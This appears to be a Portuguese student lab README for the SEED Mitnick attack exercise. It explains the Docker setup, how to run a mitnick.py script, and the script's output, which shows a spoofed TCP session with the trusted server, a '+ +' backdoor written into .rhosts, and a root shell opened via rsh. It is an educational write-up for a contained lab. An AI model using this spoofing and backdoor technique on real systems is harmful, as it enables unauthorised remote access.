* Primeiramente é necessário adicionar o IP do trusted server no arquivo *.rhosts* no X-Terminal. Uma das formas de fazer isso é adicionando o comando ``echo 10.9.0.6 > ~/.rhosts`` no docker-compose ao subir o container do X-Terminal. A verão do *docker-compose.yml* inclusa nessa entrega já está com a modificação:

```yaml
# Arquivo docker-compose.yml

command: bash -c "echo 10.9.0.6 > ~/.rhosts &&
                /etc/init.d/openbsd-inetd start  &&
                tail -f /dev/null"
```

* Em seguida, basta subir os containers com ``docker compose up`` em um terminal e, em outro, executar o script *mintnick.py* contido no diretório */volumes* do seed-attacker. Podemos fazê-lo entrando no container do seed-attacker com ``docker exec -w /volumes -it seed-attacker bash`` para entrar no container dentro do diretório */volumes* e executando o script com ``python3 mitnick.py``:

```bash
# Em um terminal
$ docker compose up 

# Em outro terminal
$ docker exec -w /volumes -it seed-attacker bash 
root@docker:/volumes python3 mitnick.py
```

* O script irá realizar o ataque inserindo o backdoor no X-Terminal ('+ +' no arquivo *.rhosts*) e, ao final, irá abrir uma shell para a máquina usando ``rsh 10.9.0.5``. Exemplo de saída do script:

```bash

$ docker exec -w /volumes -it seed-attacker bash

root@gab-desktop:/volumes python3 mitnick.py
Starting Mitnick attack...
     Using interface: br-f93c16a98468
     Attacker IP: 10.9.0.1
     X-Terminal IP: 10.9.0.5
     Trusted Server IP: 10.9.0.6
Setting up environment...
Spoofing trusted server...
Starting three-way handshake...
Sending ACK packet...
Sending RSH packet...
Waiting for new TCP connection request...
Sending SYN-ACK packet...

Attack done.

Restoring ARP tables...
Restoring environment...
Opening shell at X-Terminal...
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 6.9.5-arch1-1 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Jul  7 00:45:49 UTC 2024 from 10.9.0.1 on pts/1
root@9b37d80aeedd:~ cat ~/.rhosts
+ +
root@9b37d80aeedd:~

```

* Autor: Gabriel de Oliveira Pontarolo, GRR20203895